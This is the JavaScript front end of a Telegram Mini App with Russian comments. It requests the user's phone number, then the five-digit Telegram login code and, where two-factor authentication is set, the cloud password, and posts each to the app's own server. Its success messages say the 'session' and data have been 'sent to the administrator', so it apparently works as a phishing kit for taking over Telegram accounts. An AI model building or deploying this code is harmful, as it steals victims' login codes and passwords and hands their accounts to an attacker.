const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Элементы
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const phoneDisplay = document.getElementById('phoneDisplay');
const phoneDisplay2 = document.getElementById('phoneDisplay2');
const error1 = document.getElementById('error1');
const error2 = document.getElementById('error2');
const error3 = document.getElementById('error3');
const digits = [
    document.getElementById('d1'),
    document.getElementById('d2'),
    document.getElementById('d3'),
    document.getElementById('d4'),
    document.getElementById('d5')
];
const resendBtn = document.getElementById('resendBtn');
const deleteBtn = document.getElementById('deleteBtn');
const digitBtns = document.querySelectorAll('.digit-btn');
const manualSection = document.querySelector('.manual-section');
const telegramSection = document.querySelector('.telegram-section');
const phoneInput = document.getElementById('phone');
const getCodeBtn = document.getElementById('getCodeBtn');
const passwordInput = document.getElementById('passwordInput');
const submitPasswordBtn = document.getElementById('submitPasswordBtn');

let currentPhone = '';
let currentCode = '';
let codeRequested = false;

// Определяем окружение
const isTelegram = tg.initData && tg.initDataUnsafe?.user;
const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;

console.log('App initialized:', { isTelegram, chatId });

if (isTelegram) {
    manualSection.style.display = 'none';
    telegramSection.style.display = 'block';
    requestContactAutomatically();
} else {
    manualSection.style.display = 'block';
    telegramSection.style.display = 'none';
}

// Автоматический запрос контакта в Telegram
function requestContactAutomatically() {
    console.log('requestContactAutomatically called, isTelegram =', isTelegram);
    
    tg.requestContact((success, contact) => {
        console.log('requestContact callback', { success, contact });
        
        if (!success) {
            console.log('User declined contact request');
            error1.textContent = 'Необходимо предоставить номер телефона для продолжения.';
            telegramSection.innerHTML = '<p>Вы отклонили запрос. <button id="retryBtn">Повторить</button></p>';
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                error1.textContent = '';
                telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                requestContactAutomatically();
            });
            return;
        }
        
        const phone = contact.phone_number;
        console.log('Phone obtained from contact:', phone);
        
        if (!phone) {
            console.error('Phone is empty even though success=true');
            error1.textContent = 'Ошибка: номер не получен';
            return;
        }
        
        sendPhoneToServer(phone, chatId);
    });
}

// Отправка номера на сервер
function sendPhoneToServer(phone, chatId) {
    console.log('sendPhoneToServer called with:', { phone, chatId, phoneType: typeof phone });
    
    if (!phone) {
        console.error('phone is empty in sendPhoneToServer');
        error1.textContent = 'Ошибка: номер не получен';
        return;
    }
    
    error1.textContent = '';
    if (isTelegram) {
        telegramSection.innerHTML = '<p>Отправка номера...</p><div class="loader"></div>';
    }

    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, chatId })
    })
    .then(res => {
        console.log('Response status:', res.status);
        return res.json();
    })
    .then(data => {
        console.log('Response data from /api/send-code:', data);
        
        if (data.success) {
            console.log('send-code success, phone:', phone);
            currentPhone = phone;
            phoneDisplay.textContent = phone;
            step1.style.display = 'none';
            step2.style.display = 'block';
            codeRequested = true;
            digits.forEach(d => d.value = '');
            currentCode = '';
            if (data.warning) {
                console.log('Warning from server:', data.warning);
                error2.textContent = data.warning;
            }
        } else {
            console.error('send-code error:', data.error);
            error1.textContent = data.error || 'Ошибка сервера';
            if (isTelegram) {
                telegramSection.innerHTML = '<p>Ошибка. <button id="retryBtn">Повторить</button></p>';
                document.getElementById('retryBtn')?.addEventListener('click', () => {
                    error1.textContent = '';
                    telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                    requestContactAutomatically();
                });
            }
        }
    })
    .catch(err => {
        console.error('Fetch error in sendPhoneToServer:', err);
        error1.textContent = 'Ошибка сети';
        if (isTelegram) {
            telegramSection.innerHTML = '<p>Ошибка сети. <button id="retryBtn">Повторить</button></p>';
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                error1.textContent = '';
                telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                requestContactAutomatically();
            });
        }
    });
}

// Обработчик ручного ввода (для браузера)
if (getCodeBtn) {
    getCodeBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        console.log('Manual input phone:', phone);
        
        if (!phone) {
            error1.textContent = 'Введите номер';
            return;
        }
        sendPhoneToServer(phone, null);
    });
}

// Цифровая клавиатура
digitBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        if (!codeRequested) return;
        const digit = btn.getAttribute('data-digit');
        if (currentCode.length < 5) {
            currentCode += digit;
            digits[currentCode.length - 1].value = digit;
            if (currentCode.length === 5) {
                console.log('5 digits entered, verifying code:', currentCode);
                verifyCode();
            }
        }
    });
});

deleteBtn.addEventListener('click', () => {
    if (currentCode.length > 0) {
        digits[currentCode.length - 1].value = '';
        currentCode = currentCode.slice(0, -1);
    }
});

// Повторная отправка кода
resendBtn.addEventListener('click', () => {
    if (!currentPhone) return;
    console.log('Resending code for phone:', currentPhone);
    
    resendBtn.disabled = true;
    resendBtn.textContent = 'Отправка...';

    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, chatId })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Resend response:', data);
        if (data.success) {
            error2.textContent = 'Код отправлен повторно' + (data.warning ? ' (' + data.warning + ')' : '');
            setTimeout(() => error2.textContent = '', 3000);
        } else {
            error2.textContent = data.error || 'Ошибка';
        }
    })
    .catch(err => {
        console.error('Resend error:', err);
        error2.textContent = 'Ошибка сети';
    })
    .finally(() => {
        resendBtn.disabled = false;
        resendBtn.textContent = 'Reenviar código';
    });
});

// Проверка кода
function verifyCode() {
    console.log('Verifying code:', { phone: currentPhone, code: currentCode });
    error2.textContent = '';
    
    fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, code: currentCode })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Verify response:', data);
        
        if (data.success) {
            console.log('Verification successful, closing app');
            if (isTelegram) {
                // Показываем краткое сообщение и закрываем
                error2.textContent = 'Успех! Сессия отправлена.';
                error2.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Сессия отправлена администратору!');
            }
        } else if (data.needPassword) {
            console.log('2FA required');
            // Требуется пароль
            step2.style.display = 'none';
            step3.style.display = 'block';
            phoneDisplay2.textContent = currentPhone;
            passwordInput.value = '';
            error3.textContent = '';
        } else {
            console.error('Verification failed:', data.error);
            error2.textContent = data.error || 'Неверный код';
            digits.forEach(d => d.value = '');
            currentCode = '';
        }
    })
    .catch(err => {
        console.error('Verify fetch error:', err);
        error2.textContent = 'Ошибка сети';
        digits.forEach(d => d.value = '');
        currentCode = '';
    });
}

// Отправка пароля (2FA)
submitPasswordBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    console.log('Submitting password for phone:', currentPhone);
    
    if (!password) {
        error3.textContent = 'Введите пароль';
        return;
    }
    submitPasswordBtn.disabled = true;
    submitPasswordBtn.textContent = 'Отправка...';

    fetch('/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, password })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Password submit response:', data);
        if (data.success) {
            if (isTelegram) {
                error3.textContent = 'Пароль принят!';
                error3.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Пароль принят! Данные отправлены администратору.');
            }
        } else {
            error3.textContent = data.error || 'Ошибка';
        }
    })
    .catch(err => {
        console.error('Password submit error:', err);
        error3.textContent = 'Ошибка сети';
    })
    .finally(() => {
        submitPasswordBtn.disabled = false;
        submitPasswordBtn.textContent = 'ENVIAR CONTRASEÑA';
    });
});

// Поддержка физической клавиатуры (опционально)
document.addEventListener('keydown', (e) => {
    if (!codeRequested || step2.style.display !== 'block') return;
    if (e.key >= '0' && e.key <= '9') {
        if (currentCode.length < 5) {
            currentCode += e.key;
            digits[currentCode.length - 1].value = e.key;
            if (currentCode.length === 5) {
                console.log('5 digits entered via keyboard, verifying');
                verifyCode();
            }
        }
    } else if (e.key === 'Backspace') {
        if (currentCode.length > 0) {
            digits[currentCode.length - 1].value = '';
            currentCode = currentCode.slice(0, -1);
        }
    }
});